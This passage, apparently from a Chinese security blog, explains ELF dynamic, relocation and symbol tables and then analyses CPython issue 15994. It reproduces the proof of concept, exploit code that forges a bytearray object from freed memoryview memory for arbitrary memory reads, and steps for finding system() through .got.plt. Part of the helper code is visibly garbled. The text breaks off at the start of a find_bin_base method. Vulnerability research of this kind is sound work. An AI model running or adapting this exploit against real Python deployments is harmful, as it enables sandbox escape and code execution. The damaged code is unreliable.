    #define DT_SYMENT   11
    #define DT_INIT     12
    #define DT_FINI     13
    #define DT_SONAME   14
    #define DT_RPATH    15
    #define DT_SYMBOLIC 16
    #define DT_REL          17
    #define DT_RELSZ    18
    #define DT_RELENT   19
    #define DT_PLTREL   20
    #define DT_DEBUG    21
    #define DT_TEXTREL  22
    #define DT_JMPREL   23
    #define DT_LOPROC   0x70000000
    #define DT_HIPROC   0x7fffffff
    #define DT_MIPS_RLD_VERSION 0x70000001
    #define DT_MIPS_TIME_STAMP  0x70000002
    #define DT_MIPS_ICHECKSUM   0x70000003
    #define DT_MIPS_IVERSION    0x70000004
    #define DT_MIPS_FLAGS       0x70000005
      #define RHF_NONE        0
      #define RHF_HARDWAY         1
      #define RHF_NOTPOT          2
    #define DT_MIPS_BASE_ADDRESS    0x70000006
    #define DT_MIPS_CONFLICT    0x70000008
    #define DT_MIPS_LIBLIST     0x70000009
    #define DT_MIPS_LOCAL_GOTNO 0x7000000a
    #define DT_MIPS_CONFLICTNO  0x7000000b
    #define DT_MIPS_LIBLISTNO   0x70000010
    #define DT_MIPS_SYMTABNO    0x70000011
    #define DT_MIPS_UNREFEXTNO  0x70000012
    #define DT_MIPS_GOTSYM      0x70000013
    #define DT_MIPS_HIPAGENO    0x70000014
    #define DT_MIPS_RLD_MAP     0x70000016
    //other
    #define DT_INIT_ARRAY       0x19
    #define DT_INIT_ARRAYSZ     0x1b
    #define DT_FINI_ARRAY       0x1a
    #define DT_FINI_ARRAYSZ     0x1c
部分类型的解释，参考《程序员的自我修养》
d_tag类型 | d_un的含义  
---|---  
DT_NEEDED |
依赖的共享对象文件，d_ptr表示所依赖共享对象文件名在引用的字符串表中的偏移，引用的字符串表在段表中的索引根据Section的sh_link来确定  
DT_SYMTAB | 动态链接符号表在内存中的地址，d_ptr表示.dynsym的地址  
DT_STRTAB | 动态链接字符串表在内存中的地址，d_ptr表示.dynstr的地址  
DT_STRSZ | 动态链接字符串表的大小，d_val表示大小  
DT_HASH | 动态链接hash表地址，d_ptr表示.hash的地址  
DT_SONAME | 本共享对象的"SO-NAME"，因此仅.so文件存在  
DT_RPATH | 动态链接共享对象搜索路径  
DT_INIT | 初始化代码地址，.init的地址  
DT_FINI | 结束代码的地址，.fini的地址  
DT_REL | 动态链接重定位表的地址，如.rel  
DT_RELA | 动态链接重定位表的地址，如.rela.dyn  
DT_RELENT | 动态重定位表入口数量  
DT_RELAENT | 动态重定位表入口数量  
DT_INIT_ARRAY | .init_array的地址  
DT_INIT_ARRAYSZ | .init_array的长度  
DT_FINI_ARRAY | .fini_array的地址  
DT_FINI_ARRAYSZ | .fini_array的长度  
DT_PLTGOT | .got.plt的地址  
DT_JMPREL | .rela.plt的地址，PLT相关的重定位表地址  
## 3.4 重定位表
重定位表是有两种，在看段表时，是会看到.rel和.rela开头的重定位表，分别对应的结构体稍有不同。（PS:段表是Section Header
Table，但由于不加载到内存中，所以就未作详细说明）
    typedef struct elf64_rel {
      Elf64_Addr r_offset;  /* Location at which to apply the action */
      Elf64_Xword r_info;   /* index and type of relocation */
    } Elf64_Rel;
    typedef struct elf64_rela {
      Elf64_Addr r_offset;  /* Location at which to apply the action */
      Elf64_Xword r_info;   /* index and type of relocation */
      Elf64_Sxword r_addend;    /* Constant addend used to compute value */
    } Elf64_Rela;
r_offset：占8字节，重定位的地址。
r_info：占8字节，最低位`4`字节用于表示类型，高`4`位字节用于表示对应的值。
Exp中关注的重定位表是.rela.plt(.dynamic中的DT_JMPREL所指)，该表中r_info_type的类型都是R_X86_64_JUMP_SLO，对应的值为7，而r_info_value表示的是重定位的符号在符号表中的索引，.rela.plt相关的符号表是.dynsym(.dynamic中的DT_SYMTAB所指)。
## 3.5 符号表
符号表每一项代表一个符号，符号表的第一项（索引为0）一般为无效项。结构体如下：
    typedef struct elf64_sym {
      Elf64_Word st_name;       /* Symbol name, index in string tbl */
      unsigned char st_info;    /* Type and binding attributes */
      unsigned char st_other;   /* No defined meaning, 0 */
      Elf64_Half st_shndx;      /* Associated section index */
      Elf64_Addr st_value;      /* Value of the symbol */
      Elf64_Xword st_size;      /* Associated symbol size */
    } Elf64_Sym;
Elf64_Sym[0:4]：st_name
占4字节，表示符号名称字符串在字符串表的偏移量，但具体是哪个字符串表则需要看自身所在段表的段描述项的sh_link（表示引用的字符串段表描述项在段表中的索引）。
Exp关注的符号表是.dynsym，它所关联的字符串表是.dynstr(.dynamic中的DT_STRTAB所指)。
# 0x04 漏洞与Exp
## 4.1 起因
原文作者是关注到了一个issue：[memoryview to freed memory can cause
segfault](https://bugs.python.org/issue15994)。
看一下POC
    import io
    class File(io.RawIOBase):
        def readinto(self, buf):
            global view
            view = buf
        def readable(self):
            return True
    f = io.BufferedReader(File())
    f.read(1)                       # get view of buffer used by BufferedReader
    del f                           # deallocate buffer
    view = view.cast('P')
    L = [None] * len(view)          # create list whose array has same size
                                    # (this will probably coincide with view)
    view[0] = 0                     # overwrite first item with NULL
    print(L[0])                     # segfault: dereferencing NULL
### 4.1.1 获取memoryview
POC中的全局变量view的类型是`memoryview`，至于原因我勉强根据官方文档与源码注释找了一下，且就一看，这一段我并不保证完全正确。
执行`f.read(1)`，会调用到自定义类的readinto方法，并传入memoryview类型的buf参数。
首先根据官方文档`https://docs.python.org/3/library/io.html#io.BufferedReader`，知道BufferedReader继承于`BufferedIOBase`。
调用链：
  1. BufferedIOBase的read方法：`_io__Buffered_read_impl`，内部会调用`_bufferedreader_read_generic`
  2. `_bufferedreader_read_generic`内部会调用`_bufferedreader_raw_read`
  3. `_bufferedreader_raw_read`内部会使用`PyMemoryView_FromBuffer`创建memoryview对象，然后通过`PyObject_CallMethodOneArg(self->raw, _PyIO_str_readinto, memobj)`去调用子类的readinto方法。
源代码版本3.10.4，仅保留了调用链部分代码，完整代码可根据第一行注释的路径去查看源码。
    //Modules\_io\bufferedio.c
    /*[clinic input]
    _io._Buffered.read
        size as n: Py_ssize_t(accept={int, NoneType}) = -1
        /
    [clinic start generated code]*/
    static PyObject *
    _io__Buffered_read_impl(buffered *self, Py_ssize_t n)
    /*[clinic end generated code: output=f41c78bb15b9bbe9 input=7df81e82e08a68a2]*/
    {
        ......
            res = _bufferedreader_read_generic(self, n);
        ......
    }
    /* Generic read function: read from the stream until enough bytes are read,
     * or until an EOF occurs or until read() would block.
     */
    static PyObject *
    _bufferedreader_read_generic(buffered *self, Py_ssize_t n)
    {
       ......
            r = _bufferedreader_raw_read(self, out + written, r);
        ......
    }
    static Py_ssize_t
    _bufferedreader_raw_read(buffered *self, char *start, Py_ssize_t len)
    {
        ......
        memobj = PyMemoryView_FromBuffer(&buf);
        if (memobj == NULL)
            return -1;
        /* NOTE: PyErr_SetFromErrno() calls PyErr_CheckSignals() when EINTR
           occurs so we needn't do it ourselves.
           We then retry reading, ignoring the signal if no handler has
           raised (see issue #10956).
        */
        do {
            res = PyObject_CallMethodOneArg(self->raw, _PyIO_str_readinto, memobj);
        } while (res == NULL && _PyIO_trap_eintr());
        ......
    }
### 4.1.2 释放对象
`del
f`将会释放对象，那么view指向的对象就释放了；无法通过python代码创建一个memoryview对象去指向一个bytes类对象，后del指向的对象并不会释放内存，因为引用计数未清零。
### 4.1.3 重新申请同样大小的内存
`view = view.cast('P')`：将view内中的数据理解为指针，因为需要根据view的长度来申请新的内存，根据`1.5
list`的分析，ob_item指向的是指针数组，POC就是想让这段内存正好等于view指向的，所以先将view的数据类型转化为指针，再根据view的长度创建list对象，也就是`L
= [None] * len(view)`。
此时view存储的就是PyObject*，都是指向的None对象，然后通过将第一个指针改为0，再获取导致报错。
当然也可以通过id来获取其他对象的地址，其实也是PyObject*，那么赋值给view[0]，即可修改list L的成员了，如：
    view[0] = id('a')
    print(L[0]) # a
## 4.2 漏洞利用
### 4.2.1 内存泄露
利用漏洞可以让memoryview对象view指向一个PyObject*[]，利用id函数指向不同的对象，再利用list对象`L[n]`来使用对象。
这里就想到了bytearray了，结构体中是存在指针的，只需要将ob_bytes和ob_start的位置处填入想要读取的内存地址，再使得view[0] =
id(bytearray对象)，那么L[0]就可以作为ByteArray对象读取字节数据了,比如L[0][0:8]读取对应地址的前8字节。
    typedef struct {
        PyObject_VAR_HEAD
        Py_ssize_t ob_alloc;   /* How many bytes allocated in ob_bytes */
        char *ob_bytes;        /* Physical backing buffer */
        char *ob_start;        /* Logical start inside ob_bytes */
        Py_ssize_t ob_exports; /* How many buffer exports */
    } PyByteArrayObject;
现在的问题就是如何修改ob_bytes和ob_start了，作者给出的答案是伪造一个`PyByteArrayObject`，使用的bytes类，因为bytes的数据就是存储在`PyBytesObject`中，通过id获取PyBytesObject对象的首地址，再加上固定偏移量，即可指向ob_sval，ob_sval的值我们是可以控制的。
    typedef struct {
        PyObject_VAR_HEAD
        Py_hash_t ob_shash;
        char ob_sval[1];
    } PyBytesObject;
最终效果如下(作者的exp代码)
    io = open.__self__
    def uN(b):
        out = 0
        for i in range(len(b)):
            out |= (b[i] & 0xff)  0:
            s.append(x & 0xff)
            x >>= 8
        return s.ljust(8, b'\0')
    def flat(*args):
        return b''.join(args)
    class File(io._RawIOBase):
        def readinto(self, buf):
            global view
            view = buf
        def readable(self):
            return True
    class Exploit:
        def _create_fake_byte_array(self, addr, size):
            byte_array_obj = flat(
                p64(10),            # refcount
                p64(id(bytearray)), # type obj
                p64(size),          # ob_size
                p64(size),          # ob_alloc
                p64(addr),          # ob_bytes
                p64(addr),          # ob_start
                p64(0x0),           # ob_exports
            )
            self.no_gc.append(byte_array_obj)  # stop gc from freeing after return
            self.freed_buffer[0] = id(byte_array_obj) + 32
        def leak(self, addr, length):
            self._create_fake_byte_array(addr, length)
            return self.fake_objs[0][0:length]
        def __init__(self):
            # Trigger bug
            global view
            f = io.BufferedReader(File())
            f.read(1)
            del f
            view = view.cast('P')
            self.fake_objs = [None] * len(view)
            self.freed_buffer = view
            self.no_gc = []
在Exploit的 **init**
函数中获取了memoryview对象，存储为`freed_buffer`，`fake_objs`则是申请的list对象，其存储数据内存空间由freed_buffer指向。
### 4.2.2 寻找system函数地址
先说一下思路，主要是解析ELF文件，根据.dynamic中的信息去读取.got.plt['system']的值，读取内存的方法都是利用的`4.2.1内存泄露`。
  1. 根据PyTypeObject的找到函数的地址，该地址必定在.text段，处于一个Segment，且该Segment的地址必定高于ELF文件头的Segment；
  2. 根据页对齐原则（一般是0x1000对齐），向低地址遍历，找到ELF文件头魔数`\x7fELF`,因为加载的时候文件头必定是加载在页的首地址处的，并且此页的首地址是程序的基址；
  3. 解析ELF文件头，根据e_type的值判断是否开启PIE。
  4. 解析ELF文件头，获取PHT的首地址、PHT的个数、PHT每项的大小，进行遍历，找到p_type的值为PT_DYNAMIC(2)，获取到.dynamic的内存地址，，如果 **开启PIE** ，那么获取到的内存地址需要 **加上** 第2步获取到的 **程序基址** ；
  5. 遍历.dynamic段，获取到重定位表(DT_JMPREL：23)，符号表(DT_SYMTAB：6)，字符串表(DT_STRTAB：5)，这里获取到的地址已经是绝对地址了，即使开启了PIE，也已经重定位好了。
  6. 遍历重定位表，根据r_info的高4位获取在符号表中的索引，因为.dynamic中指向的重定位表的类型都是R_X86_64_JUMP_SLO；再根据符号表中的st_name去读取字符串表，找到名称为"system"，那么此时的重定位表的r_offset的值就是.got.plt['system']的地址。（PS：作者的exp中则是根据重定位表的偏移去读取的.got.plt表中的相应偏移，）
说明一下，第6步和作者的exp思路稍有不同，不同点如下：
  * 作者的exp中则是根据重定位表的偏移去读取的.got.plt表中的相应偏移，我这认为重定位表的r_offset值就是了，作者不信任r_offset的原因我并不知道；
  * 作者没有完全信任.got.plt['system']的值，如果存在PLT，则还去寻找了桩代码，但是ELF的延迟绑定，.got.plt['system']一开始存储的就是PLT桩代码，这一点作者不信任.got.plt['system']的原因我也并不知道；
但是我认为我的思路没有什么问题，因此精简了一下作者查找system函数地址的exp
    PAGE_SIZE = 4096
    SIZEOF_ELF64_SYM = 24
    class Exploit:
        def find_bin_base(self):